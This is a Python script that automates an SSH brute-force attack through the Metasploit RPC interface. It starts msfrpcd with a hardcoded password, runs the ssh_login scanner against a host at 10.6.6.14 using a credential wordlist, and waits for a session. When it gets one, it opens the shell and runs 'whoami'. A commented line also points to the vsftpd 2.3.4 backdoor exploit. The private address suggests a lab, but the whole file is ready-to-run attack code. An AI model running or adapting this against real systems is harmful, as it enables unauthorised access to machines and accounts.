from pymetasploit3.msfrpc import MsfRpcClient
import time
import os
import pyfiglet

verbose = True

banner = pyfiglet.figlet_format("SSH Brute Force")
print(banner)
print("==" * 40)
os.system("pkill -f msfrpcd")
time.sleep(0.5)
os.system("msfrpcd -a 127.0.0.1 -S False -p 1597 -P yourpassword")
time.sleep(10.0)
# msfrpcd -a 127.0.0.1 -p 1597 -P yourpassword

## Usage example

# Connect to the RPC server
# client = MsfRpcClient('yourpassword')
client = MsfRpcClient("yourpassword", port=1597, ssl=False)
time.sleep(2.0)

# exploit = client.modules.use("exploit", "unix/ftp/vsftpd_234_backdoor")
auxiliary = client.modules.use("auxiliary", "scanner/ssh/ssh_login")
print(auxiliary.required)
# Set module options
auxiliary["RHOSTS"] = "10.6.6.14"
# auxiliary["RPORT"] = "21"

# Get required options
auxiliary[
    "USERPASS_FILE"
] = "/usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt"
auxiliary.execute(payload="cmd/unix/interact")

starttime = time.time()
while True:
    print("check if a session is found every 20 seconds")
    # print(client.sessions.list.keys())
    # auxiliary["ShowProgressPercent"]
    if len(client.sessions.list.keys()) != 0:
        print("Sessions avaiables : ")
        for s in client.sessions.list.keys():
            print(s)
    if len(client.sessions.list.keys()) >= 1:
        break
    time.sleep(20.0 - ((time.time() - starttime) % 20.0))

shell = client.sessions.session(list(client.sessions.list.keys())[0])
time.sleep(5)
# Write to the shell
shell.write("whoami")
# Print the output
if verbose:
    print(shell.read())
time.sleep(5)
# Stop the shell
result = shell.stop()
if verbose:
    print(result["result"])
# if result["result"] == "success" and return_shell:
# return shell
